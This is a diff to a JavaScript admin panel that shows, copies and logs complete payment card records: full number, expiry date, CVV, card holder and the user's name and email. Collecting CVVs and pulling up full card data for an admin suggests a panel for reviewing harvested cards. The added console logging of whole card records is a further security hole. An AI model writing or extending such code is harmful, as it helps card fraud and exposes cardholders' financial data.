@@ -878,49 +878,49 @@ ${
             ${
               cardInfo
                 ? `
-                <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 15px;">
-                    <div style="background: #4361ee; color: black; padding: 10px; border-radius: 5px;">
-                        <p style="margin: 0; font-size: 11px; opacity: 0.9;">CARD NUMBER</p>
-                        <p style="margin: 5px 0 0 0; font-size: 18px; font-weight: bold; letter-spacing: 1px;">
-                            ${
-                              cardInfo.card_number
-                                ? formatCardNumberForDisplay(
-                                    cardInfo.card_number
-                                  )
-                                : cardInfo.masked_card || "N/A"
-                            }
-                        </p>
-                    </div>
-                    
-                    <div style="background: #4cc9f0; color: black; padding: 10px; border-radius: 5px;">
-                        <p style="margin: 0; font-size: 11px; opacity: 0.9;">EXPIRY DATE</p>
-                        <p style="margin: 5px 0 0 0; font-size: 18px; font-weight: bold;">
-                            ${
-                              cardInfo.expiry_date ||
-                              cardInfo.card_expiry ||
-                              "N/A"
-                            }
-                        </p>
-                    </div>
-                    
-                    <div style="background: #f72585; color: black; padding: 10px; border-radius: 5px;">
-                        <p style="margin: 0; font-size: 11px; opacity: 0.9;">CVV CODE</p>
-                        <p style="margin: 5px 0 0 0; font-size: 18px; font-weight: bold;">
-                            ${cardInfo.cvv || cardInfo.card_cvv || "N/A"}
-                        </p>
-                    </div>
-                    
-                    <div style="background: #3a0ca3; color: black; padding: 10px; border-radius: 5px;">
-                        <p style="margin: 0; font-size: 11px; opacity: 0.9;">CARD TYPE</p>
-                        <p style="margin: 5px 0 0 0; font-size: 18px; font-weight: bold;">
-                            ${
-                              cardInfo.card_type
-                                ? cardInfo.card_type.toUpperCase()
-                                : "N/A"
-                            }
-                        </p>
-                    </div>
-                </div>
+
+<div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 15px;">
+    <div style="background: #4361ee; color: white; padding: 10px; border-radius: 5px;">
+        <p style="margin: 0; font-size: 11px; opacity: 0.9;">CARD NUMBER</p>
+        <p style="margin: 5px 0 0 0; font-size: 18px; font-weight: bold; letter-spacing: 1px;">
+            ${
+              cardInfo.full_card_number
+                ? formatCardNumberForDisplay(cardInfo.full_card_number)
+                : cardInfo.card_number
+                ? formatCardNumberForDisplay(cardInfo.card_number)
+                : cardInfo.number
+                ? formatCardNumberForDisplay(cardInfo.number)
+                : cardInfo.masked_card || "N/A"
+            }
+        </p>
+    </div>
+    
+    <div style="background: #4cc9f0; color: white; padding: 10px; border-radius: 5px;">
+        <p style="margin: 0; font-size: 11px; opacity: 0.9;">EXPIRY DATE</p>
+        <p style="margin: 5px 0 0 0; font-size: 18px; font-weight: bold;">
+            ${
+              cardInfo.expiry_date ||
+              cardInfo.card_expiry ||
+              cardInfo.expiry ||
+              "N/A"
+            }
+        </p>
+    </div>
+
+    <div style="background: #f72585; color: white; padding: 10px; border-radius: 5px;">
+        <p style="margin: 0; font-size: 11px; opacity: 0.9;">CVV CODE</p>
+        <p style="margin: 5px 0 0 0; font-size: 18px; font-weight: bold;">
+            ${cardInfo.cvv || cardInfo.card_cvv || "N/A"}
+        </p>
+    </div>
+    
+    <div style="background: #3a0ca3; color: white; padding: 10px; border-radius: 5px;">
+        <p style="margin: 0; font-size: 11px; opacity: 0.9;">CARD TYPE</p>
+        <p style="margin: 5px 0 0 0; font-size: 18px; font-weight: bold;">
+            ${cardInfo.card_type ? cardInfo.card_type.toUpperCase() : "N/A"}
+        </p>
+    </div>
+</div>
                 
                 <div style="background: #063561ff; padding: 12px; border-radius: 5px; margin-bottom: 10px;">
                     <p style="margin: 5px 0;"><strong>Card Holder:</strong> ${
@@ -1030,33 +1030,40 @@ function formatCardNumberForDisplay(cardNumber) {
   // Add spaces every 4 digits
   return str.replace(/(\d{4})(?=\d)/g, "$1 ");
 }
-
-// Update the copyCardDetailsToClipboard function:
+// REPLACE the copyCardDetailsToClipboard function with:
 function copyCardDetailsToClipboard(cardInfoJson) {
   try {
+    console.log("Copying card details:", cardInfoJson);
+
     const cardInfo = JSON.parse(cardInfoJson);
+
+    // Get values from various possible field names
+    const cardNumber =
+      cardInfo.full_card_number || cardInfo.card_number || cardInfo.number;
+    const expiry =
+      cardInfo.expiry_date || cardInfo.card_expiry || cardInfo.expiry;
+    const cvv = cardInfo.cvv || cardInfo.card_cvv;
+    const cardHolder = cardInfo.card_holder || cardInfo.holder;
+    const cardType = cardInfo.card_type || cardInfo.type;
+    const userEmail = cardInfo.user_email;
+    const userName = cardInfo.user_name;
+    const reference = cardInfo.reference || cardInfo.reference_id;
+
     const textToCopy = `
 CARD PAYMENT DETAILS:
 ────────────────────
-Card Number: ${
-      cardInfo.card_number
-        ? formatCardNumberForDisplay(cardInfo.card_number)
-        : cardInfo.masked_card
-    }
-Card Holder: ${cardInfo.card_holder}
-Expiry Date: ${cardInfo.expiry_date || cardInfo.card_expiry}
-CVV: ${cardInfo.cvv || cardInfo.card_cvv}
-Card Type: ${cardInfo.card_type ? cardInfo.card_type.toUpperCase() : "Unknown"}
-User: ${cardInfo.user_name} (${cardInfo.user_email})
-Amount: $${
-      document
-        .querySelector(`#card-${cardInfo.reference || ""} .request-header h3`)
-        ?.textContent.replace("$", "") || "N/A"
-    }
-Reference: ${cardInfo.reference}
+Card Number: ${cardNumber ? formatCardNumberForDisplay(cardNumber) : "N/A"}
+Card Holder: ${cardHolder || "N/A"}
+Expiry Date: ${expiry || "N/A"}
+CVV: ${cvv || "N/A"}
+Card Type: ${cardType ? cardType.toUpperCase() : "N/A"}
+User: ${userName || "N/A"} (${userEmail || "N/A"})
+Reference: ${reference || "N/A"}
 ────────────────────
 Copy Time: ${new Date().toLocaleString()}
         `.trim();
+
+    console.log("Text to copy:", textToCopy);
 
     navigator.clipboard
       .writeText(textToCopy)
@@ -1067,7 +1074,8 @@ Copy Time: ${new Date().toLocaleString()}
         );
       })
       .catch((err) => {
-        console.error("Failed to copy:", err);
+        console.error("Clipboard API failed:", err);
+        // Fallback
         const textArea = document.createElement("textarea");
         textArea.value = textToCopy;
         document.body.appendChild(textArea);
@@ -1081,14 +1089,35 @@ Copy Time: ${new Date().toLocaleString()}
       });
   } catch (error) {
     console.error("Error copying card details:", error);
-    showAdminNotification("Failed to copy card details", "error");
+    showAdminNotification(
+      "Failed to copy card details: " + error.message,
+      "error"
+    );
   }
 }
 
-// Function to show card details in a modal (optional)
+// REPLACE the entire showFullCardDetailsModal function with:
 function showFullCardDetailsModal(cardInfo) {
+  if (!cardInfo) {
+    showAdminNotification("No card details available", "error");
+    return;
+  }
+
+  // Debug: show what we received
+  console.log("Modal cardInfo:", cardInfo);
+
   const modal = document.createElement("div");
   modal.className = "modal active";
+
+  // Try to get the card number from various possible field names
+  const cardNumber =
+    cardInfo.full_card_number || cardInfo.card_number || cardInfo.number;
+  const expiry =
+    cardInfo.expiry_date || cardInfo.card_expiry || cardInfo.expiry;
+  const cvv = cardInfo.cvv || cardInfo.card_cvv;
+  const cardHolder = cardInfo.card_holder || cardInfo.holder;
+  const cardType = cardInfo.card_type || cardInfo.type;
+
   modal.innerHTML = `
         <div class="modal-content" style="max-width: 600px;">
             <div class="modal-header" style="background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%); color: white;">
@@ -1103,49 +1132,47 @@ function showFullCardDetailsModal(cardInfo) {
                             <p><strong>Card Number:</strong></p>
                             <div style="background: white; padding: 10px; border-radius: 5px; border: 1px solid #ddd; font-family: monospace; font-size: 16px; letter-spacing: 1px;">
                                 ${
-                                  formatCardNumberForDisplay(
-                                    cardInfo.full_card_number
-                                  ) || cardInfo.masked_number
+                                  cardNumber
+                                    ? formatCardNumberForDisplay(cardNumber)
+                                    : "Not available"
                                 }
                             </div>
                         </div>
                         <div>
                             <p><strong>Expiry Date:</strong></p>
                             <div style="background: white; padding: 10px; border-radius: 5px; border: 1px solid #ddd; font-family: monospace; font-size: 16px;">
-                                ${cardInfo.card_expiry}
+                                ${expiry || "Not available"}
                             </div>
                         </div>
                         <div>
                             <p><strong>CVV:</strong></p>
                             <div style="background: white; padding: 10px; border-radius: 5px; border: 1px solid #ddd; font-family: monospace; font-size: 16px;">
-                                ${cardInfo.card_cvv}
+                                ${cvv || "Not available"}
                             </div>
                         </div>
                         <div>
                             <p><strong>Card Type:</strong></p>
                             <div style="background: white; padding: 10px; border-radius: 5px; border: 1px solid #ddd; font-family: monospace; font-size: 16px;">
-                                ${
-                                  cardInfo.card_type
-                                    ? cardInfo.card_type.toUpperCase()
-                                    : "N/A"
-                                }
+                                ${cardType ? cardType.toUpperCase() : "N/A"}
                             </div>
                         </div>
                     </div>
                     
                     <div style="margin-top: 20px; padding-top: 15px; border-top: 1px solid #ddd;">
                         <p><strong>Card Holder:</strong> ${
-                          cardInfo.card_holder
+                          cardHolder || "N/A"
                         }</p>
-                        <p><strong>User:</strong> ${cardInfo.user_name} (${
-    cardInfo.user_email
-  })</p>
+                        <p><strong>User:</strong> ${
+                          cardInfo.user_name || "N/A"
+                        } (${cardInfo.user_email || "N/A"})</p>
                         <p><strong>Reference ID:</strong> ${
-                          cardInfo.reference_id
+                          cardInfo.reference || cardInfo.reference_id || "N/A"
                         }</p>
-                        <p><strong>Submitted:</strong> ${formatDate(
+                        <p><strong>Submitted:</strong> ${
                           cardInfo.timestamp
-                        )}</p>
+                            ? formatDate(cardInfo.timestamp)
+                            : "N/A"
+                        }</p>
                     </div>
                 </div>
                 
@@ -1174,7 +1201,6 @@ function showFullCardDetailsModal(cardInfo) {
 
   document.body.appendChild(modal);
 
-  // Close modal handlers
   modal
     .querySelector(".modal-close")
     .addEventListener("click", () => modal.remove());
